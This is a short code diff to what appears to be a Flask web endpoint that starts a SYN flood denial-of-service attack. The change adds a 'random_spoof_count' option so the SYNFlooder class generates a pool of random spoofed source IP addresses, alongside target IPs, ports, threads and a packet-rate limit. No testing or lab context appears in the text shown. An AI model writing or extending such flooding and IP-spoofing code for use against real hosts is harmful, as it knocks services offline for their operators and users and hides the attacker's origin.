@@ -151,6 +151,7 @@ def start_syn_attack():
         num_threads = data.get('threads', 10)
         rate_limit = data.get('rate_limit_pps')
         spoof_pool = data.get('spoof_ips') or []
+        random_spoof_count = int(data.get('random_spoof_count') or 0)
         
         # Validate
         if not target_ips:
@@ -164,7 +165,14 @@ def start_syn_attack():
             return jsonify({'error': 'Attack already running'}), 400
         
         # Create SYN flooder
-        flooder = SYNFlooder(target_ips, target_ports, num_threads, spoof_pool=spoof_pool, rate_limit_pps=rate_limit)
+        flooder = SYNFlooder(
+            target_ips,
+            target_ports,
+            num_threads,
+            spoof_pool=spoof_pool,
+            rate_limit_pps=rate_limit,
+            spoof_pool_size=random_spoof_count,
+        )
         
         # Start in background thread
         def run_attack():
